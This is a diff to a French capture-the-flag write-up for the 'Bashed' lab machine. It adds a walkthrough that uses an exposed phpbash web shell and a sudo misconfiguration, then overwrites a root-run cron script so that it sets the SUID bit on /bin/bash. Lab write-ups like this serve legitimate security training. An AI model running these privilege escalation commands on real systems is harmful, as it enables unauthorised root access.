@@ -487,171 +487,294 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 ## Prise pied
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+### Identification de phpbash
 
----
+L’énumération web montre que le site présente le projet **phpbash**.
 
-## Escalade de privilèges
+![Page d’accueil de phpbash présentant le projet et son fonctionnement](phpbash-home-page.png)
 
-{{< escalade-intro user="ssh_user" >}}
+Le texte de la page indique que cet outil permet d’obtenir un shell semi-interactif directement depuis le navigateur, sans passer par une connexion SSH ou un reverse shell classique.
 
-## Escalade de privilèges
+Ce détail est important : sur cette machine, l’objectif initial n’est pas d’exploiter une application complexe, mais d’identifier où l’outil phpbash a été laissé accessible sur le serveur web.
 
-### Observation passive avec pspy64
+{{< figure src="index-dev.png" alt="Index du répertoire /dev/ montrant le fichier phpbash.php" class="img-left-60" >}}
 
-```bash
-./pspy64
+
+
+La découverte du répertoire `/dev/` permet ensuite d’accéder au fichier suivant :
+
+```url
+http://bashed.htb/dev/phpbash.php
 ```
 
-Si système 32 bits :
+En ouvrant cette page dans le navigateur, tu obtiens une console web exécutée côté serveur.
 
-```bash
-./pspy32
-```
+### Accès au système en tant que www-data
 
-### Vérification sudo
-
-```bash
-sudo -l
-```
-
-### Exploration du contexte utilisateur
+Depuis l’interface phpbash, tu vérifies le contexte d’exécution :
 
 ```bash
 whoami
 id
 pwd
-uname -a
-hostname
-find /home /opt -type f -readable 2>/dev/null
 ```
 
-### Capabilities
+![Interface phpbash exécutant les commandes whoami, id et pwd en tant que www-data](phpbash-shell.png)
 
-```bash
-getcap -r / 2>/dev/null
-```
-
-### SUID
-
-```bash
-python3 suid3num.py
-```
-
-Alternative :
-
-```bash
-find / -perm -4000 -type f 2>/dev/null
-```
-
-### Services locaux
-
-```bash
-ss -tulnp
-```
-
-Alternative :
-
-```bash
-netstat -tulnp
-```
-
-### Recherche d’un service derrière un port local
-
-Exemple avec le port `8080` :
-
-```bash
-grep -r ':8080' /etc 2>/dev/null
-```
-
-Recherche élargie :
-
-```bash
-grep -r '8080' /etc 2>/dev/null
-```
-
-### Tunnel SSH vers un service local
-
-Exemple avec un service local sur `127.0.0.1:8080` :
-
-```bash
-ssh -L 8080:127.0.0.1:8080 user@target
-```
-
-Accès depuis Kali :
+Le shell s’exécute avec l’utilisateur du serveur web :
 
 ```text
-http://localhost:8080
+www-data
 ```
 
-### Linpeas
-
-```bash
-./linpeas.sh
-```
-
-### Dernier recours : le kernel
-
-```bash
-uname -a
-./les.sh
-```
-
-### Conclusion de l’énumération privilege escalation
-
-À la fin de cette phase, tu peux résumer les pistes testées :
-
-* sudo
-* contexte utilisateur
-* fichiers lisibles
-* capabilities
-* SUID
-* cron et timers
-* services locaux
-* LinPEAS
-* kernel
-
-Dans ce cas précis, la piste exploitable est :
+Le répertoire courant correspond au dossier dans lequel se trouve phpbash :
 
 ```text
-<résumer ici la piste réellement exploitée>
+/var/www/html/dev
 ```
 
-### Exploitation de la piste identifiée
+À ce stade, l’accès obtenu n’est pas un shell SSH classique, mais il permet déjà d’exécuter des commandes sur la machine avec les droits de `www-data`.
 
-Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.
+Tu peux alors commencer l’énumération locale depuis ce contexte.
+
+### Exploration des répertoires utilisateurs
+
+Tu consultes le contenu de `/home` :
 
 ```bash
-<commandes d’exploitation>
+ls -la /home
 ```
 
-Tu confirmes l’élévation de privilèges :
-
-```bash
-whoami
-id
-hostname
-```
-
-Résultat attendu :
+La sortie montre deux répertoires utilisateurs :
 
 ```text
-root
-uid=0(root) gid=0(root) groups=0(root)
-machine
+total 16
+drwxr-xr-x 4 root root 4096 Dec 4 2017 .
+drwxr-xr-x 23 root root 4096 Jun 2 2022 ..
+drwxr-xr-x 4 arrexel arrexel 4096 Jun 2 2022 arrexel
+drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec 4 2017 scriptmanager
 ```
 
-### root.txt
+Deux comptes locaux sont donc visibles :
 
-Une fois root, tu peux lire le flag final :
+- `arrexel`
+- `scriptmanager`
+
+Tu explores d’abord le répertoire de `arrexel`, car c’est le compte utilisateur classique de la machine :
 
 ```bash
-cat /root/root.txt
+ls -la /home/arrexel
+total 32
+drwxr-xr-x 4 arrexel arrexel 4096 Jun 2 2022 .
+drwxr-xr-x 4 root root 4096 Dec 4 2017 ..
+lrwxrwxrwx 1 root root 9 Jun 2 2022 .bash_history -> /dev/null
+-rw-r--r-- 1 arrexel arrexel 220 Dec 4 2017 .bash_logout
+-rw-r--r-- 1 arrexel arrexel 3786 Dec 4 2017 .bashrc
+drwx------ 2 arrexel arrexel 4096 Dec 4 2017 .cache
+drwxrwxr-x 2 arrexel arrexel 4096 Dec 4 2017 .nano
+-rw-r--r-- 1 arrexel arrexel 655 Dec 4 2017 .profile
+-rw-r--r-- 1 arrexel arrexel 0 Dec 4 2017 .sudo_as_admin_successful
+-r--r--r-- 1 arrexel arrexel 33 Jun 15 01:17 user.txt
 ```
 
-Cette étape termine l’escalade de privilèges.
+Le fichier `user.txt` est lisible depuis le contexte `www-data`. Tu peux donc récupérer le flag utilisateur :
+
+```bash
+cat /home/arrexel/user.txt
+6ef1xxxxxxxxxxxxxxxxxxxxxxxx7ddd
+```
+
+Le flag utilisateur est obtenu depuis le shell web exécuté en tant que `www-data`.
+
+
+
+### Vérification des droits sudo
+
+L’étape suivante consiste à vérifier si l’utilisateur `www-data` dispose de droits sudo particuliers.
+
+```bash
+sudo -l
+```
+
+La sortie indique que `www-data` peut exécuter toutes les commandes en tant que l’utilisateur `scriptmanager`, sans mot de passe :
+
+```text
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+```
+
+Le droit `sudo` obtenu ne donne pas directement un accès root. En revanche, il permet de quitter le simple contexte web `www-data` pour exécuter des commandes avec l’identité de `scriptmanager`:
+
+```bash
+sudo -u scriptmanager id
+```
+
+La sortie confirme le changement de contexte :
+
+```bash
+uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
+```
+
+Comme ce compte dispose de son propre répertoire dans `/home`, l’étape logique consiste maintenant à refaire une énumération locale avec ses droits. L’objectif est de repérer les fichiers et répertoires auxquels `scriptmanager` a accès, et qui n’étaient pas forcément visibles ou exploitables depuis `www-data`.
+
+Cette énumération marque le début de l’escalade de privilèges.
+
+
+
+## Escalade de privilèges
+
+## Escalade de privilèges
+
+### Énumération avec les droits de scriptmanager
+
+Tu refais maintenant une énumération locale avec l’identité de `scriptmanager`.
+
+La première recherche vise les fichiers appartenant à cet utilisateur :
+
+```bash
+sudo -u scriptmanager find / -user scriptmanager -ls
+```
+
+La sortie est très verbeuse, notamment à cause de nombreux chemins liés à `/proc`.
+
+Pour obtenir un résultat plus lisible, tu relances la recherche en excluant `/proc` :
+
+```bash
+sudo -u scriptmanager find / -path /proc -prune -o -user scriptmanager -ls
+```
+
+La sortie contient encore des erreurs de permissions. Tu ajoutes donc une redirection des erreurs vers `/dev/null`, puis tu filtres les lignes liées à `scriptmanager` :
+
+```bash
+sudo -u scriptmanager find / -path /proc -prune -o -user scriptmanager -ls 2>/dev/null | grep scriptmanager
+```
+
+Cette énumération fait ressortir notamment les éléments suivants :
+
+```text
+drwxr-xr-x   2 scriptmanager scriptmanager      4096 Dec 4 2017 /scripts
+-rw-r--r--   1 scriptmanager scriptmanager        58 Dec 4 2017 /scripts/test.py
+drwxr-xr-x   3 scriptmanager scriptmanager      4096 Dec 4 2017 /home/scriptmanager
+```
+
+Le répertoire `/scripts` n’est donc pas deviné : il ressort directement de l’énumération effectuée avec les droits de `scriptmanager`.
+
+### Analyse du répertoire /scripts
+
+Tu inspectes ensuite le contenu du répertoire `/scripts` :
+
+```bash
+sudo -u scriptmanager ls -la /scripts
+```
+
+La sortie montre deux fichiers intéressants :
+
+```text
+total 16
+drwxr-xr-x  2 scriptmanager scriptmanager 4096 Dec 4 2017 .
+drwxr-xr-x 23 root          root          4096 Jun 2 2022 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec 4 2017 test.py
+-rw-r--r--  1 root          root            12 Jun 15 01:20 test.txt
+```
+
+Le fichier `test.py` appartient à `scriptmanager`. Grâce au droit `sudo` obtenu depuis `www-data`, tu peux donc lire et modifier ce fichier.
+
+Tu affiches son contenu :
+
+```bash
+sudo -u scriptmanager cat /scripts/test.py
+```
+
+Le script Python est très simple :
+
+```python
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close()
+```
+
+Il écrit une chaîne de caractères dans le fichier `test.txt`.
+
+Or, dans `/scripts`, le fichier `test.txt` appartient à `root` :
+
+```text
+-rw-r--r--  1 root root 12 Jun 15 01:20 test.txt
+```
+
+C’est un indice fort : le script est probablement exécuté par `root`, ou au moins dans un contexte privilégié.
+
+### Vérification de l’exécution automatique
+
+Pour vérifier le comportement sans outil supplémentaire, tu observes l’horodatage du fichier `test.txt` :
+
+```bash
+sudo -u scriptmanager ls -l /scripts/test.txt
+```
+
+Après environ une minute, tu relances la même commande :
+
+```bash
+sudo -u scriptmanager ls -l /scripts/test.txt
+```
+
+L’horodatage change, tandis que le propriétaire reste `root`.
+
+Le script `test.py` est donc exécuté régulièrement dans un contexte privilégié. Comme il appartient à `scriptmanager`, tu peux le modifier et profiter de cette exécution automatique pour élever tes privilèges.
+
+- ### Modification de test.py
+
+  L’objectif est d’obtenir un moyen simple d’exécuter une commande avec les privilèges root.
+
+  Une méthode efficace consiste à faire poser le bit SUID sur `/bin/bash`. Dans phpbash, le signe `+` peut poser problème dans certaines commandes. Pour éviter cette difficulté, tu utilises directement la notation numérique des permissions avec `chmod 4755`.
+
+  Tu remplaces donc le contenu de `/scripts/test.py` avec les droits de `scriptmanager` :
+
+  ```bash
+  sudo -u scriptmanager bash -c 'cat > /scripts/test.py << "EOF"
+  import os
+  os.system("chmod 4755 /bin/bash")
+  EOF'
+  ```
+
+  Cette commande ne donne pas root immédiatement. Elle modifie seulement le fichier `test.py`, qui appartient à `scriptmanager`.
+
+  L’élévation se produit lorsque ce script est exécuté à nouveau dans son contexte privilégié.
+
+  Tu vérifies ensuite les permissions de `/bin/bash` :
+
+  ```bash
+  ls -l /bin/bash
+  ```
+
+  Lorsque le bit SUID est en place, les permissions contiennent un `s` sur la partie utilisateur :
+
+  ```text
+  -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash
+  ```
+
+  Le `s` dans `rws` indique que `/bin/bash` s’exécutera avec les privilèges effectifs de son propriétaire, ici `root`.
+
+  ### Lecture du flag root
+
+  Dans un terminal classique, `/bin/bash -p` permettrait d’obtenir un shell avec les privilèges effectifs de root.
+
+  Ici, l’exécution se fait depuis phpbash. Pour éviter les limites de ce shell web, tu lances directement les commandes nécessaires avec l’option `-c` :
+
+  ```bash
+  /bin/bash -p -c 'id; whoami; cat /root/root.txt'
+  ```
+
+  La sortie confirme que l’utilisateur effectif est `root` :
+
+  ```text
+  uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+  root
+  c27bxxxxxxxxxxxxxxxxxxxxxxxx9225
+  ```
+
+  L’accès root est confirmé et le flag final est récupéré : la machine est terminée.
+
+
 
 ## Conclusion
 
